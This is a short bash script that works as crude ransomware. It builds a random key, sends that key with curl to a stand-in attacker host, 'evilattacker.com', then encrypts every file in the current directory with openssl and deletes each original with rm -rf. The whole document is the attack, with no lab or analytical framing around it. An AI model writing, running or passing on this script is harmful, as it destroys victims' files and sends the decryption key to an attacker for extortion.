#!/bin/bash
array=(*)
key=`cat /dev/random | LC_CTYPE=C tr -dc "[:alpha:]" | head -c 8`
curl http://evilattacker.com/grab.php?key=$key

for i in "${array[@]}"
do
	openssl enc -aes-256-cbc -salt -in $i -out $i.enc -k $key
	rm -rf $i
done
